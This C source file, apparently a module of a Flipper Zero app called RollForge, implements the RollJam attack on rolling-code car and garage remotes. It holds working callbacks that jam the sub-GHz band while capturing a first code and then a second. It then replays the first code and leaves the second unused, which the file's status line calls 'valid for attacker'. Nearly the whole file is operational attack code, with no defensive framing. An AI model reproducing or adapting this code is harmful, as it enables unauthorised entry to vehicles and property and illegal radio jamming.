// module_rolljam.c — RollJam phase engine for RollForge
#include "module_rolljam.h"
#include <gui/canvas.h>
#include <lib/subghz/devices/devices.h>
#include <lib/toolbox/level_duration.h>
#include <notification/notification_messages.h>

// Interrupt-accessible globals
static volatile bool      s_jam    = false;
static volatile RfSig*    s_cap    = NULL;
static volatile RollForgeApp* s_rep = NULL;

// ---------------------------------------------------------------------------
// Interrupt callbacks
// ---------------------------------------------------------------------------
static void rj_rx_cb(bool level, uint32_t duration, void* ctx) {
    UNUSED(ctx);
    RfSig* sig = (RfSig*)s_cap;
    if(!sig || sig->ready || duration == 0) return;
    if(sig->count < RF_SIG_BUF) {
        uint32_t d = (duration > 0x7FFFFFFFUL) ? 0x7FFFFFFFUL : duration;
        sig->buf[sig->count++] = (level ? 0x80000000UL : 0UL) | d;
    }
    if((!level && duration >= RF_SILENCE_US && sig->count >= RF_MIN_EDGES) ||
       sig->count >= RF_SIG_BUF)
        sig->ready = true;
}

static LevelDuration rj_jam_cb(void* ctx) {
    UNUSED(ctx);
    if(!s_jam) return level_duration_reset();
    static bool lvl = false;
    lvl = !lvl;
    return level_duration_make(lvl, 250);
}

static LevelDuration rj_replay_cb(void* ctx) {
    UNUSED(ctx);
    RollForgeApp* app = (RollForgeApp*)s_rep;
    if(!app) return level_duration_reset();
    size_t pos = app->rj.tx_pos;
    if(pos >= app->rj.sig_a.count) return level_duration_reset();
    app->rj.tx_pos = pos + 1;
    uint32_t p = app->rj.sig_a.buf[pos];
    return level_duration_make((p & 0x80000000UL) != 0, (p & 0x7FFFFFFFUL) ?: 100);
}

// ---------------------------------------------------------------------------
// RF helpers (local — use shared device from app)
// ---------------------------------------------------------------------------
static void rj_jam_start(RollForgeApp* app) {
    s_jam = true;
    subghz_devices_idle(app->device);
    subghz_devices_start_async_tx(app->device, rj_jam_cb, NULL);
    app->rf_op = RF_JAMMING;
}

static void rj_jam_stop(RollForgeApp* app) {
    s_jam = false;
    subghz_devices_stop_async_tx(app->device);
    subghz_devices_idle(app->device);
    app->rf_op = RF_IDLE;
}

static void rj_cap_start(RollForgeApp* app, RfSig* sig) {
    sig->count = 0; sig->ready = false;
    s_cap = sig;
    subghz_devices_idle(app->device);
    subghz_devices_start_async_rx(app->device, rj_rx_cb, NULL);
    app->rf_op = RF_CAPTURING;
}

static void rj_cap_stop(RollForgeApp* app) {
    subghz_devices_stop_async_rx(app->device);
    s_cap = NULL;
    subghz_devices_idle(app->device);
    app->rf_op = RF_IDLE;
}

static void rj_cleanup_rf(RollForgeApp* app) {
    s_jam = false; s_cap = NULL; s_rep = NULL;
    subghz_devices_stop_async_tx(app->device);
    subghz_devices_stop_async_rx(app->device);
    subghz_devices_idle(app->device);
    app->rf_op = RF_IDLE;
}

// Interlaced jam+capture — blocks, polls abort + event queue
static bool rj_jam_capture(RollForgeApp* app, RfSig* sig, const char* label) {
    uint32_t start = furi_get_tick();
    sig->count = 0; sig->ready = false;
    while(!app->abort && (furi_get_tick() - start) < RF_TIMEOUT_MS) {
        snprintf(app->rj.status, sizeof(app->rj.status), "%s jam...", label);
        rj_jam_start(app);
        uint32_t t = furi_get_tick() + 180;
        while(furi_get_tick() < t && !app->abort) furi_delay_ms(5);
        rj_jam_stop(app);

        snprintf(app->rj.status, sizeof(app->rj.status), "%s RX...", label);
        rj_cap_start(app, sig);
        t = furi_get_tick() + 80;
        while(furi_get_tick() < t && !sig->ready && !app->abort) furi_delay_ms(5);
        rj_cap_stop(app);

        view_port_update(app->vp);

        InputEvent ev;
        while(furi_message_queue_get(app->eq, &ev, 0) == FuriStatusOk)
            if(ev.key == InputKeyBack && ev.type == InputTypeShort) app->abort = true;

        if(sig->ready && sig->count >= RF_MIN_EDGES) return true;
    }
    return false;
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------
void rj_enter(RollForgeApp* app) {
    app->rj.phase = RJ_IDLE;
    snprintf(app->rj.status, sizeof(app->rj.status), "[OK] Start  [Back] Exit");
}

void rj_exit(RollForgeApp* app) {
    rj_cleanup_rf(app);
    app->rj.phase = RJ_IDLE;
}

void rj_input(RollForgeApp* app, InputEvent* ev) {
    if(ev->type != InputTypeShort) return;
    ModRollJam* m = &app->rj;
    if(ev->key == InputKeyOk && m->phase == RJ_IDLE) {
        m->phase = RJ_PHASE1;
    } else if(ev->key == InputKeyOk && m->phase == RJ_CAPTURED) {
        m->phase = RJ_PHASE2;
    } else if(ev->key == InputKeyOk && m->phase == RJ_DONE) {
        m->phase = RJ_IDLE;
        snprintf(m->status, sizeof(m->status), "[OK] Start  [Back] Exit");
    }
}

void rj_tick(RollForgeApp* app) {
    ModRollJam* m = &app->rj;
    if(!app->device) {
        snprintf(m->status, sizeof(m->status), "ERR: No CC1101");
        return;
    }
    switch(m->phase) {
    case RJ_IDLE:
    case RJ_DONE:
        break;

    case RJ_PHASE1: {
        bool ok = rj_jam_capture(app, &m->sig_a, "Ph1");
        if(app->abort) { m->phase = RJ_IDLE; rj_cleanup_rf(app);
            snprintf(m->status, sizeof(m->status), "Aborted"); app->abort = false; break; }
        if(ok) {
            snprintf(m->status, sizeof(m->status), "A: %u edges — [OK] Ph2", (unsigned)m->sig_a.count);
            m->phase = RJ_CAPTURED;
        } else {
            snprintf(m->status, sizeof(m->status), "Ph1 Timeout");
            m->phase = RJ_IDLE;
        }
        break;
    }

    case RJ_CAPTURED:
        break;

    case RJ_PHASE2: {
        bool ok = rj_jam_capture(app, &m->sig_b, "Ph2");
        if(app->abort) { m->phase = RJ_IDLE; rj_cleanup_rf(app);
            snprintf(m->status, sizeof(m->status), "Aborted"); app->abort = false; break; }
        if(ok) {
            snprintf(m->status, sizeof(m->status), "B: %u — Replaying A...", (unsigned)m->sig_b.count);
            m->tx_pos = 0; s_rep = app;
            subghz_devices_idle(app->device);
            subghz_devices_start_async_tx(app->device, rj_replay_cb, NULL);
            app->rf_op = RF_REPLAYING;
            m->phase = RJ_REPLAY;
        } else {
            snprintf(m->status, sizeof(m->status), "Ph2 Timeout");
            m->phase = RJ_IDLE;
        }
        break;
    }

    case RJ_REPLAY: {
        bool done = (m->tx_pos >= m->sig_a.count) ||
                    subghz_devices_is_async_complete_tx(app->device);
        if(done || app->abort) {
            s_rep = NULL;
            subghz_devices_stop_async_tx(app->device);
            subghz_devices_idle(app->device);
            app->rf_op = RF_IDLE; app->abort = false;
            snprintf(m->status, sizeof(m->status), "Done! B valid for attacker.");
            m->phase = RJ_DONE;
            notification_message(app->notif, &sequence_success);
        }
        break;
    }
    }
}

void rj_draw(Canvas* canvas, RollForgeApp* app) {
    ModRollJam* m = &app->rj;
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 0, 10, "RollForge > RollJam");
    canvas_draw_line(canvas, 0, 12, 127, 12);

    static const char* phase_labels[] = {
        "IDLE", "PHASE 1", "CAPTURED", "PHASE 2", "REPLAYING", "DONE"
    };
    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str(canvas, 0, 24, phase_labels[m->phase]);
    canvas_draw_str_aligned(canvas, 127, 24, AlignRight, AlignTop,
        app->rf_op == RF_JAMMING   ? "[JAM]"  :
        app->rf_op == RF_CAPTURING ? "[RX]"   :
        app->rf_op == RF_REPLAYING ? "[TX]"   : "");

    canvas_draw_str(canvas, 0, 37, app->rj.status);

    if(m->phase == RJ_REPLAY) {
        char buf[32];
        snprintf(buf, sizeof(buf), "TX %u/%u", (unsigned)m->tx_pos, (unsigned)m->sig_a.count);
        canvas_draw_str(canvas, 0, 50, buf);
    } else if(m->phase == RJ_CAPTURED || m->phase == RJ_DONE) {
        char buf[48];
        snprintf(buf, sizeof(buf), "A:%u  B:%u", (unsigned)m->sig_a.count, (unsigned)m->sig_b.count);
        canvas_draw_str(canvas, 0, 50, buf);
    }

    canvas_draw_str(canvas, 0, 63, "[Back]=Menu");
}
